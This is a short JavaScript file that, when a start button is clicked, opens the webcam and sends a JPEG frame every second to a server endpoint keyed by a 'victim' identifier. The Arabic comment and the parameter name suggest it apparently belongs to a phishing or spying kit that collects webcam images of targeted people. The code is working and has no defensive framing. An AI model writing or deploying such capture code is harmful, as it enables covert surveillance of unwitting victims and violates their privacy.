let stream = null;

document.getElementById("start").addEventListener("click", async () => {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        const video = document.getElementById("video");
        video.srcObject = stream;

        // إرسال الصور للسيرفر كل ثانية
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");

        setInterval(() => {
            if (!stream) return;
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const frameData = canvas.toDataURL("image/jpeg");

            fetch(`/api/camera_frame?victim=${victimId}`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ image: frameData })
            });
        }, 1000);

    } catch (err) {
        console.error("Camera error:", err);
    }
});

document.getElementById("stop").addEventListener("click", () => {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
});
